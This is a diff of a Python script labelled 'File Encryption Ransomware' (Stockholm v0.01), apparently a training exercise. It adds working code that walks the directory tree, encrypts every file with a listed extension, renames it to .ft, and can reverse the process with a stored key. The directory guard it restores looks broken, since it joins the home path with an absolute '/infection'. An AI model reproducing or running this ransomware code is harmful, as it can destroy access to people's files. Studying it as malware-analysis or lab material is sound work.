@@ -5,31 +5,69 @@ import argparse
 import sys
 import os
 
-def encrypt() :
-	with open("extensions", "r") as f:
-		extensions = [i.strip() for i in f.readlines() if i.strip()]
-	curr_dir = os.getcwd()
+
+def loadKey() :
+	return open("key", "rb").read()
+
+
+def genKey() :
 	key = Fernet.generate_key()
 	with open("key", "wb") as key_file:
 		key_file.write(key)
-	f = Fernet(key)
+	return Fernet(key)
+
+
+def rev(args : str) :
+	curr_dir = os.getcwd()
+	files = []
+	k = Fernet(loadKey())
+	for (curr_dir, dir_names, file_names) in os.walk(curr_dir):
+		files_tmp = [f"{curr_dir}/{i}" for i in file_names]
+		files.extend(files_tmp)
+	to_decrypt = [file for file in files if os.path.splitext(file)[1] == ".ft"]
+	try:
+		for i in to_decrypt:
+			with open(i, "rb") as f:
+				text = k.decrypt(f.read())
+			with open(i, "wb") as f:
+				f.write(text)
+			os.rename(i, i[:-3])
+			if not args.silent:
+				print(f"{i} has been decrypted.")
+	except Exception as e :
+		print(f"Error: decrypting file {i}: {e}")
+
+
+def encrypt(args : str) :
+	with open("extensions", "r") as f:
+		extensions = [i.strip() for i in f.readlines() if i.strip()]
+	curr_dir = os.getcwd()
+	k = genKey()
 	files = []
 	for (curr_dir, dir_names, file_names) in os.walk(curr_dir):
 		files_tmp = [f"{curr_dir}/{i}" for i in file_names]
 		files.extend(files_tmp)
 	to_encrypt = [file for file in files if os.path.splitext(file)[1].lower() in extensions]
-	# for i in files:
-		# with open(i, "wrb") as f:
-		# 	f.encrypt(f.read())
-	
+	try:
+		for i in to_encrypt:
+			with open(i, "rb") as f:
+				text = k.encrypt(f.read())
+			with open(i, "wb") as f:
+				f.write(text)
+			os.rename(i, f"{i}.ft")
+			if not args.silent:
+				print(f"{i} has been encrypted.")
+	except Exception as e :
+		print(f"Error: encrypting file {i}: {e}")
+
 
 def main() :
 	try:
-		# home_dir = os.path.expanduser("~")
-		# curr_dir = os.getcwd()
-		# target_dir = os.path.join(home_dir, "/infection")
-		# if curr_dir != target_dir :
-		# 	raise Exception(f"currently in {curr_dir}, should be in {target_dir}");
+		home_dir = os.path.expanduser("~")
+		curr_dir = os.getcwd()
+		target_dir = os.path.join(home_dir, "/infection")
+		if curr_dir != target_dir :
+			raise Exception(f"currently in {curr_dir}, should be in {target_dir}");
 		parser = argparse.ArgumentParser(description="File Encryption Ransomware")
 		parser.add_argument("-v", "--version", help="display current stockholm version", action="store_true")
 		parser.add_argument("-r", "--reverse", metavar="KEY", type=str, help="decrypt files")
@@ -38,9 +76,12 @@ def main() :
 		if args.version :
 			print("Stockholm: v0.01")
 		if not args.reverse :
-			encrypt();
+			encrypt(args)
+		else:
+			rev(args)
 	except Exception as e:
 		print(f"Error: {e}")
+
 
 if __name__ == "__main__" :
 	main()
